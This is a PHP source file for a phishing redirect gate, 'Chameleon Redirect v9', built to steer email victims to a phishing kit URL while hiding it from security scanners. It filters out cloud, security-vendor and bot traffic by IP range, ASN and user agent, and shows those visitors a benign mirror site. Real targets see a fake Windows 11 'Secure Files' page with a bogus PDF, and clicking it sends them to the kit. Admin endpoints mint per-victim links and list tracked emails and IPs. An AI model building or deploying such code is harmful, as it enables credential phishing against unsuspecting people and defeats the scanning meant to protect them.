<?php
/**
 * =====================================================================
 *  CHAMELEON REDIRECT — v9 (COVER PAGE: WINDOWS "SECURE FILES" VIEW)
 * =====================================================================
 *  NEW IN v9:
 *   [v9.1] The human challenge is now a full Windows 11 File Explorer
 *          "This PC > Documents > Secure Files" cover page. The victim
 *          sees folders + a PDF ("Statement of account.pdf") and must
 *          CLICK the file / Open button — the click submits the JS
 *          challenge and redirects to the kit. No more "Redirecting…"
 *          splash; the page itself is the disguise.
 *   [v9.2] Supports BOTH link families in one file:
 *            /<16-hex>          minted links (/_new)
 *            /<email|b64|hex>   auto-grab links (self-registering)
 *
 *  Carry-over: local CIDR bot table (no outbound), ipinfo bonus,
 *  arming windows, per-link budgets, /_list, /_stats (all encodings).
 * =====================================================================
 */

// ---------------------------------------------------------------- config
const PAYLOAD_DEST  = 'https://redwoodpersonnel.com/4b56077f3d33f790ab09';   // kit URL INCLUDING its victim param prefix
const MIRROR_SITE   = 'https://goldenchippz.co.uk/';    // benign mirror (adjust per domain)
const ARM_DELAY_MIN = 20;    // arming for MINTED links (/_new)
const ARM_DELAY_MAX = 75;
const VISIT_BUDGET   = 6;    // default budget for minted links without "visits"
const SESSION_TTL   = 1800;
const ADMIN_KEY     = 'hghgghghu687uyhfgt5yt';
const DB_FILE       = __DIR__ . '/gate.db';
const MIRROR_FILE   = __DIR__ . '/mirror.html';
const MIRROR_TTL    = 3600;

// ---- auto-grab (email) link defaults ----
const AUTO_VISIT_BUDGET = 6;     // 3 full loads per auto email
const AUTO_TTL_HOURS    = 168;   // auto links live 7 days from first click

// cover-page document metadata (change per campaign if desired)
const DOC_NAME = 'Statement of account.pdf';
const DOC_META = '78.9 KB &middot; 4 pages &middot; November 2026';

// ------------------------------------------------- local CIDR bot table
const BOT_CIDRS = [
    '13.64.0.0/11', '20.0.0.0/8', '40.64.0.0/10', '52.96.0.0/12', '52.112.0.0/14',
    '52.120.0.0/14', '52.224.0.0/11', '74.179.0.0/16', '104.40.0.0/13', '104.208.0.0/13',
    '131.253.0.0/16', '168.61.0.0/16', '191.232.0.0/13',
    '3.0.0.0/8', '18.0.0.0/8', '54.0.0.0/8', '52.0.0.0/8', '99.77.0.0/16',
    '100.20.0.0/14', '107.20.0.0/14', '205.251.192.0/18',
    '8.34.208.0/20', '23.236.0.0/14', '34.64.0.0/10', '35.184.0.0/13', '35.192.0.0/12',
    '64.233.160.0/19', '66.249.64.0/19', '74.125.0.0/16', '104.154.0.0/15',
    '130.211.0.0/16', '142.250.0.0/15', '172.217.0.0/16', '173.194.0.0/16',
    '209.85.128.0/17', '216.239.32.0/19',
    '104.129.192.0/18', '165.225.0.0/16', '136.22.0.0/16', '147.161.0.0/16',
    '45.89.116.0/22', '94.176.128.0/17', '194.124.244.0/22', '173.249.200.0/21',
    '185.99.252.0/22',
    '172.104.0.0/13', '172.236.0.0/14', '45.33.0.0/17', '45.79.0.0/16', '139.162.0.0/16',
    '173.249.0.0/16', '149.22.64.0/18', '185.229.224.0/22',
    '104.131.0.0/16', '134.209.0.0/16', '138.197.0.0/16', '143.198.0.0/16', '159.65.0.0/16',
    '159.89.0.0/16', '165.227.0.0/16', '167.71.0.0/16', '167.99.0.0/16', '206.189.0.0/16',
    '68.183.0.0/16',
    '51.38.0.0/16', '51.68.0.0/16', '51.75.0.0/16', '54.36.0.0/14', '91.121.0.0/16',
    '137.74.0.0/16', '139.99.0.0/16', '141.94.0.0/15', '145.239.0.0/16', '147.135.0.0/16',
    '5.9.0.0/16', '23.88.0.0/17', '46.4.0.0/16', '78.46.0.0/15', '88.198.0.0/16',
    '88.99.0.0/16', '94.130.0.0/15', '116.202.0.0/15', '136.243.0.0/16', '144.76.0.0/16',
    '159.69.0.0/16', '162.55.0.0/16', '167.233.0.0/16', '168.119.0.0/16', '176.9.0.0/16',
    '178.63.0.0/16', '195.201.0.0/16', '213.239.192.0/18',
    '205.220.0.0/16', '148.163.0.0/16', '91.198.224.0/19',
];

const BOT_ASNS = [
    8075, 3598, 8068, 8069, 8071, 8073, 396982, 15169, 19527,
    16509, 14618, 39090, 22616, 207990, 203020, 63949,
    14061, 16276, 24940, 20940, 33836, 11878, 212238, 42831, 54113,
];

// ---------------------------------------------------------------- boot
date_default_timezone_set('UTC');
$uri    = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
$ip     = cfHeader('CF-Connecting-IP') ?: ($_SERVER['REMOTE_ADDR'] ?? '');
$ua     = $_SERVER['HTTP_USER_AGENT'] ?? '';
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// ---------------- management endpoints -------------------------------
if ($uri === '/_new')   { handleNew(); exit; }
if ($uri === '/_stats') { handleStats(); exit; }
if ($uri === '/_list')  { handleList(); exit; }

// ============ GATE 1a — LOCAL CIDR (no outbound, always on) ==========
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && inBotCidrs($ip)) {
    mirror(); exit;
}

// ============ GATE 1b — ipinfo ASN (bonus; safe if it fails) ==========
$asn = asnFor($ip);
if ($asn !== null && in_array($asn, BOT_ASNS, true)) {
    mirror(); exit;
}

// ================= GATE 2 — UA / method profile ========================
if (preg_match('/headlesschrome|phantomjs|puppeteer|playwright|python-requests|curl\/|wget|go-http|zgrab|masscan|facebookexternalhit|slackbot|twitterbot|discordbot/i', $ua)) {
    mirror(); exit;
}
if ($method === 'HEAD') { mirror(); exit; }

// ---------------- token: 16-hex OR auto (plain/base64/hex email) -------
$token = trim($uri, '/');
$state = null;
$isAuto = false;

if (preg_match('/^[a-f0-9]{16}$/', $token)) {
    $state = dbGet('t:' . $token);
    if (!$state) { mirror(); exit; }
} else {
    $emailCandidate = autoGrabResolve($token);
    if ($emailCandidate === null) { mirror(); exit; }
    $isAuto = true;
    $state = dbGet('e:' . $emailCandidate);
    if (!$state) {
        $state = [
            'victimId'  => $emailCandidate,
            'chSeed'    => random_int(100000000, 999999999),
            'armAt'     => time(),
            'expireAt'  => time() + AUTO_TTL_HOURS * 3600,
            'visits'    => 0,
            'budget'    => AUTO_VISIT_BUDGET,
            'passed'    => false,
            'auto'      => true,
        ];
        dbPut('e:' . $emailCandidate, $state, AUTO_TTL_HOURS * 3600);
    }
}

// ================= GATE 3 — arming window / decay ======================
$now = time();
if ($now < $state['armAt'])    { mirror(); exit; }
if ($now > $state['expireAt']) { mirror(); exit; }

// ================= GATE 4 — visit budget ==============================
if (($state['visits'] ?? 0) >= ($state['budget'] ?? VISIT_BUDGET)) { mirror(); exit; }

$state['visits'] = ($state['visits'] ?? 0) + 1;
$state['lastVisitAt'] = $now;
$state['lastIP'] = $ip;
dbPut(($isAuto ? 'e:' . $emailCandidate : 't:' . $token), $state, max(60, ($state['expireAt'] - $now)));

// ================= GATE 5 — COVER PAGE + click challenge ==============
if ($method === 'GET' && !isset($_GET['ch'])) {
    coverPage($token, (int)$state['chSeed']); exit;
}
if ($method === 'POST' && isset($_GET['ch'])) {
    $answer = $_POST['a'] ?? '';
    if ((string)solveChallenge((int)$state['chSeed']) !== (string)$answer) { mirror(); exit; }
    $state['passed'] = true;
    $state['passedAt'] = $now;
    dbPut(($isAuto ? 'e:' . $emailCandidate : 't:' . $token), $state, max(60, ($state['expireAt'] - $now)));
    $dest = PAYLOAD_DEST . rawurlencode($state['victimId'] ?: $token);
    header('Location: ' . $dest, true, 302);
    exit;
}

mirror(); exit;

// =====================================================================
//  functions
// =====================================================================

function autoGrabResolve(string $raw): ?string {
    $raw = rawurldecode($raw);
    if ($raw === '') return null;
    $emailRe = '/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/';
    if (preg_match($emailRe, $raw)) return strtolower($raw);
    $b = strtr($raw, ['-' => '+', '_' => '/']);
    $b .= str_repeat('=', (4 - strlen($b) % 4) % 4);
    $decoded = @base64_decode($b, true);
    if ($decoded !== false && preg_match($emailRe, $decoded)) return strtolower($decoded);
    if (ctype_xdigit($raw) && strlen($raw) >= 20 && strlen($raw) % 2 === 0) {
        $decoded = @hex2bin($raw);
        if ($decoded !== false && preg_match($emailRe, $decoded)) return strtolower($decoded);
    }
    return null;
}

function handleNew(): void {
    if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') { jout(['error' => 'POST required'], 405); }
    if (($_GET['k'] ?? '') !== ADMIN_KEY) { jout(['error' => 'bad key'], 403); }
    $body = json_decode(file_get_contents('php://input') ?: '{}', true) ?: [];
    $victimId = substr((string)($body['victimId'] ?? ''), 0, 200);
    $ttlHours = max(1, min(168, (int)($body['ttlHours'] ?? 48)));
    $visits = max(2, min(10000, (int)($body['visits'] ?? VISIT_BUDGET)));
    $token = bin2hex(random_bytes(8));
    $state = [
        'victimId'  => $victimId,
        'chSeed'    => random_int(100000000, 999999999),
        'armAt'     => time() + random_int(ARM_DELAY_MIN, ARM_DELAY_MAX),
        'expireAt'  => time() + $ttlHours * 3600,
        'visits'    => 0,
        'budget'    => $visits,
        'passed'    => false,
    ];
    dbPut('t:' . $token, $state, $ttlHours * 3600);
    $host = $_SERVER['HTTP_HOST'] ?? 'gate.example';
    jout([
        'link'   => 'https://' . $host . '/' . $token,
        'budget' => $visits,
        'loads'  => intdiv($visits, 2),
        'armAt'  => date('c', $state['armAt']),
        'expire' => date('c', $state['expireAt']),
    ]);
}

function handleStats(): void {
    if (($_GET['k'] ?? '') !== ADMIN_KEY) { jout(['error' => 'bad key'], 403); }
    $token = $_GET['token'] ?? '';
    if (!$token) { jout(['error' => 'token required'], 400); }
    if (preg_match('/^[a-f0-9]{16}$/', $token)) {
        $state = dbGet('t:' . $token);
        $label = $token;
    } else {
        $email = autoGrabResolve(rawurldecode($token));
        if ($email === null) { jout(['error' => 'unknown'], 404); }
        $state = dbGet('e:' . $email);
        $label = $email;
    }
    if (!$state) { jout(['error' => 'unknown'], 404); }
    jout([
        'token'     => $label,
        'victimId'  => $state['victimId'] ?? null,
        'auto'      => (bool)($state['auto'] ?? false),
        'visits'    => $state['visits'] ?? 0,
        'budget'    => $state['budget'] ?? VISIT_BUDGET,
        'loadsLeft' => max(0, intdiv((($state['budget'] ?? VISIT_BUDGET) - ($state['visits'] ?? 0)), 2)),
        'passed'    => (bool)($state['passed'] ?? false),
        'passedAt'  => isset($state['passedAt']) ? date('c', $state['passedAt']) : null,
        'lastIP'    => $state['lastIP'] ?? null,
        'armAt'     => date('c', $state['armAt']),
        'expireAt'  => date('c', $state['expireAt']),
    ]);
}

function handleList(): void {
    if (($_GET['k'] ?? '') !== ADMIN_KEY) { jout(['error' => 'bad key'], 403); }
    $db = db();
    $db->exec('CREATE TABLE IF NOT EXISTS kv (k TEXT PRIMARY KEY, v TEXT, exp INT)');
    $res = $db->query("SELECT k, v, exp FROM kv WHERE k LIKE 'e:%'");
    $list = [];
    $now = time();
    while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
        if ($row['exp'] !== null && $now > (int)$row['exp']) continue;
        $s = json_decode($row['v'], true) ?: [];
        $list[] = [
            'email'   => substr($row['k'], 2),
            'visits'  => $s['visits'] ?? 0,
            'passed'  => (bool)($s['passed'] ?? false),
            'passedAt'=> isset($s['passedAt']) ? date('c', $s['passedAt']) : null,
            'lastIP'  => $s['lastIP'] ?? null,
        ];
    }
    jout(['count' => count($list), 'emails' => $list]);
}

// ---------------- local CIDR matching (no outbound) -------------------
function inBotCidrs(string $ip): bool {
    foreach (BOT_CIDRS as $cidr) { if (cidrMatch($ip, $cidr)) return true; }
    return false;
}
function cidrMatch(string $ip, string $cidr): bool {
    [$subnet, $bits] = array_pad(explode('/', $cidr, 2), 2, '32');
    $ipL  = ip2long($ip);
    $subL = ip2long($subnet);
    if ($ipL === false || $subL === false) return false;
    $bits = (int)$bits;
    if ($bits < 0 || $bits > 32) return false;
    $mask = $bits === 0 ? 0 : (-1 << (32 - $bits)) & 0xFFFFFFFF;
    return (($ipL & $mask) === ($subL & $mask));
}

// ---------------- mirror ----------------------------------------------
function mirror(): void {
    if (file_exists(MIRROR_FILE) && time() - filemtime(MIRROR_FILE) < MIRROR_TTL) {
        header('Content-Type: text/html; charset=utf-8');
        header('Cache-Control: no-store');
        echo file_get_contents(MIRROR_FILE);
        return;
    }
    $html = fetchUrl(MIRROR_SITE);
    if ($html === null || strlen($html) < 500) {
        $html = file_exists(MIRROR_FILE) ? file_get_contents(MIRROR_FILE) : fallbackMirrorHtml();
    }
    @file_put_contents(MIRROR_FILE, $html);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo $html;
}
function fallbackMirrorHtml(): string {
    return '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Catalog</title>' .
        '<meta name="viewport" content="width=device-width,initial-scale=1"></head>' .
        '<body style="font-family:Georgia,serif;max-width:680px;margin:40px auto;line-height:1.6;color:#222">' .
        '<h1>Guides &amp; Product Notes</h1><p>A simple catalog with useful shopping resources.</p>' .
        '<p style="color:#888;font-size:13px">&copy; All rights reserved.</p></body></html>';
}

// ---------------- v9 COVER PAGE (Windows 11 Secure Files view) --------
function coverPage(string $token, int $seed): void {
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    $safe = htmlspecialchars($token, ENT_QUOTES);
    $docName = DOC_NAME;
    $docMeta = DOC_META;
    echo <<<HTML
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Secure Files</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:#161616;color:#e8e8e8;height:100vh;overflow:hidden;display:flex}
.win{width:100%;height:100vh;background:#1f1f1f;display:flex;flex-direction:column;overflow:hidden}
.titlebar{display:flex;align-items:center;gap:10px;padding:10px 14px;background:#2b2b2b;border-bottom:1px solid #3a3a3a;font-size:12.5px;color:#d7d7d7}
.titlebar .crumbs{display:flex;align-items:center;gap:7px;flex:1;min-width:0;white-space:nowrap;overflow:hidden}
.titlebar .crumbs .sep{color:#888}
.winbtns{display:flex;gap:18px;color:#bbb;font-size:12px}
.winbtns span{cursor:default}
.toolbar{display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid #333;color:#aaa}
.navbtn{width:26px;height:24px;display:flex;align-items:center;justify-content:center;border-radius:4px;font-size:11px}
.navbtn:hover,.panel:hover .folder,.file:hover{background:#333}
.search{margin-left:auto;background:#262626;border:1px solid #3a3a3a;border-radius:4px;padding:4px 10px;font-size:11.5px;color:#8a8a8a;min-width:180px}
.body{display:flex;flex:1;min-height:0}
.side{width:180px;background:#1b1b1b;border-right:1px solid #2f2f2f;padding:10px 6px;font-size:12.5px;color:#c7c7c7}
.side div{display:flex;align-items:center;gap:9px;padding:7px 10px;border-radius:4px;cursor:default}
.side div:hover{background:#2a2a2a}
.side .active{background:#333;border-left:3px solid #4cc2ff;padding-left:7px}
.side svg{flex:none;opacity:.85}
.main{flex:1;padding:16px 20px;min-width:0;overflow:auto}
.label{font-size:12px;color:#9a9a9a;margin:2px 0 10px;font-weight:600}
.folders{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:22px}
.folder{display:flex;flex-direction:column;align-items:center;gap:7px;width:112px;padding:14px 6px;border-radius:5px;font-size:12px;color:#d6d6d6;text-align:center}
.file{display:flex;align-items:center;gap:12px;padding:14px 14px;border:1px solid #3a3a3a;background:#262626;border-radius:6px;cursor:pointer;transition:background .12s}
.file:hover{border-color:#4a4a4a}
.file .pdf{flex:none}
.file .meta{flex:1;min-width:0}
.file .name{font-size:13.5px;font-weight:600;color:#f2f2f2;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.file .sub{font-size:11.5px;color:#9a9a9a;margin-top:3px}
.file .open{font-size:12px;color:#cfcfcf;background:#333;border:1px solid #4a4a4a;border-radius:4px;padding:5px 16px;flex:none}
.file:hover .open{background:#3d3d3d}
.status{display:flex;align-items:center;gap:7px;padding:6px 14px;border-top:1px solid #2f2f2f;font-size:11px;color:#8f8f8f}
.dot{width:7px;height:7px;border-radius:50%;background:#4cc2ff}
@media(max-width:640px){.side{display:none}.file .open{display:none}}
</style></head>
<body>
<div class="win">
  <div class="titlebar">
    <div class="crumbs">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9a9a9a" stroke-width="2"><path d="M3 5h18v12H3z"/><path d="M8 21h8M12 17v4"/></svg>
      <span>This PC</span><span class="sep">&gt;</span><span>Documents</span><span class="sep">&gt;</span><span style="color:#fff">Secure Files</span>
    </div>
    <div class="winbtns"><span>&#8211;</span><span>&#9723;</span><span>&#10005;</span></div>
  </div>
  <div class="toolbar">
    <div class="navbtn">&#8592;</div><div class="navbtn">&#8594;</div><div class="navbtn">&#8593;</div>
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9a9a9a" stroke-width="2"><path d="M3 5h18v12H3z"/><path d="M8 21h8M12 17v4"/></svg>
    <span style="font-size:11.5px">This PC &gt; Documents &gt; Secure Files</span>
    <div class="search">Search Secure Files</div>
  </div>
  <div class="body">
    <div class="side">
      <div><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#c7c7c7" stroke-width="2"><path d="m12 3 2.8 5.7 6.2.9-4.5 4.4 1 6.2-5.5-3-5.5 3 1-6.2L3 9.6l6.2-.9z"/></svg>Quick access</div>
      <div><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#c7c7c7" stroke-width="2"><path d="M6.5 19a4.5 4.5 0 0 1-.4-9A6 6 0 0 1 18 11.5a3.5 3.5 0 0 1-.5 7z"/></svg>OneDrive</div>
      <div class="active"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4cc2ff" stroke-width="2"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>Documents</div>
      <div><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#c7c7c7" stroke-width="2"><path d="M12 3v12m0 0 4-4m-4 4-4-4"/><path d="M4 17v3h16v-3"/></svg>Downloads</div>
    </div>
    <div class="main">
      <div class="label">Folders (3)</div>
      <div class="folders">
        <div class="panel folder" style="cursor:default">
          <svg width="44" height="36" viewBox="0 0 44 36"><path d="M2 5a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v22a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3z" fill="#f7c945"/><path d="M2 11h40v20a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3z" fill="#ffd75e"/></svg>
          Project Files
        </div>
        <div class="panel folder" style="cursor:default">
          <svg width="44" height="36" viewBox="0 0 44 36"><path d="M2 5a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v22a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3z" fill="#f7c945"/><path d="M2 11h40v20a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3z" fill="#ffd75e"/></svg>
          Archive
        </div>
        <div class="panel folder" style="cursor:default">
          <svg width="44" height="36" viewBox="0 0 44 36"><path d="M2 5a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v22a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3z" fill="#f7c945"/><path d="M2 11h40v20a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3z" fill="#ffd75e"/></svg>
          Backups
        </div>
      </div>
      <div class="label">Files (1) &middot; Click to open</div>
      <form id="f" method="POST" action="/{$safe}?ch=1">
        <input type="hidden" name="a" id="a">
        <div class="file" id="doc" onclick="openDoc()">
          <svg class="pdf" width="38" height="44" viewBox="0 0 38 44"><rect x="1" y="1" width="36" height="42" rx="3" fill="#fff"/><path d="M27 1h7l4 4v5h-11z" fill="#e6e6e6"/><rect x="9" y="14" width="20" height="16" rx="2" fill="#d93025"/><text x="19" y="25" font-family="Segoe UI,Arial" font-size="8" font-weight="bold" fill="#fff" text-anchor="middle">PDF</text></svg>
          <div class="meta">
            <div class="name">{$docName}</div>
            <div class="sub">{$docMeta}</div>
          </div>
          <div class="open" id="openlbl">Open</div>
        </div>
      </form>
    </div>
  </div>
  <div class="status"><span class="dot"></span><span id="st">1 item selected &middot; Secure connection</span></div>
</div>
<script>
var seed={$seed},ans=0,prod=(seed*7)+"";
for(var i=0;i<prod.length;i++){ans+=parseInt(prod[i]);}
document.getElementById("a").value=ans;
function openDoc(){
  var l=document.getElementById("openlbl");l.textContent="Opening\u2026";
  document.getElementById("st").textContent="Opening document\u2026 please wait";
  try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText("");}}catch(e){}
  setTimeout(function(){document.getElementById("f").submit();},350+Math.random()*300);
}
</script>
</body></html>
HTML;
}
function solveChallenge(int $seed): int {
    $prod = (string)($seed * 7);
    $ans = 0;
    for ($i = 0; $i < strlen($prod); $i++) { $ans += (int)$prod[$i]; }
    return $ans;
}

// ---------------- infrastructure ---------------------------------------
function db(): SQLite3 {
    static $db = null;
    if ($db === null) { $db = new SQLite3(DB_FILE); $db->busyTimeout(3000); }
    return $db;
}
function dbPut(string $key, array $val, ?int $ttl = null): void {
    $db = db();
    $exp = $ttl !== null ? time() + $ttl : null;
    $db->exec('CREATE TABLE IF NOT EXISTS kv (k TEXT PRIMARY KEY, v TEXT, exp INT)');
    $stmt = $db->prepare('INSERT OR REPLACE INTO kv (k, v, exp) VALUES (:k, :v, :e)');
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $stmt->bindValue(':v', json_encode($val), SQLITE3_TEXT);
    $stmt->bindValue(':e', $exp, SQLITE3_INTEGER);
    $stmt->execute();
}
function dbGet(string $key): ?array {
    $db = db();
    $db->exec('CREATE TABLE IF NOT EXISTS kv (k TEXT PRIMARY KEY, v TEXT, exp INT)');
    $stmt = $db->prepare('SELECT v, exp FROM kv WHERE k = :k');
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $res = $stmt->execute();
    $row = $res->fetchArray(SQLITE3_ASSOC);
    if (!$row) return null;
    if ($row['exp'] !== null && time() > (int)$row['exp']) { $db->exec("DELETE FROM kv WHERE k = '" . SQLite3::escapeString($key) . "'"); return null; }
    $val = json_decode($row['v'], true);
    return is_array($val) ? $val : null;
}
function fetchUrl(string $url): ?string {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    ]);
    $out = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($code >= 200 && $code < 300 && is_string($out)) ? $out : null;
}
function asnFor(string $ip): ?int {
    static $cache = null;
    $cacheFile = __DIR__ . '/asn.json';
    if ($cache === null && file_exists($cacheFile)) { $cache = json_decode(file_get_contents($cacheFile), true) ?: []; }
    if (isset($cache[$ip])) { return $cache[$ip]; }
    $res = @file_get_contents('https://ipinfo.io/' . urlencode($ip) . '/json');
    $asn = null;
    if ($res) {
        $j = json_decode($res, true);
        if (isset($j['org']) && preg_match('/^AS(\d+)/', $j['org'], $m)) { $asn = (int)$m[1]; }
    }
    $cache[$ip] = $asn;
    @file_put_contents($cacheFile, json_encode(array_slice($cache, -500)));
    return $asn;
}
function cfHeader(string $name): ?string {
    $v = $_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $name))] ?? null;
    return $v ?: null;
}
function jout(array $obj, int $status = 200): void {
    http_response_code($status);
    header('Content-Type: application/json');
    echo json_encode($obj);
    exit;
}
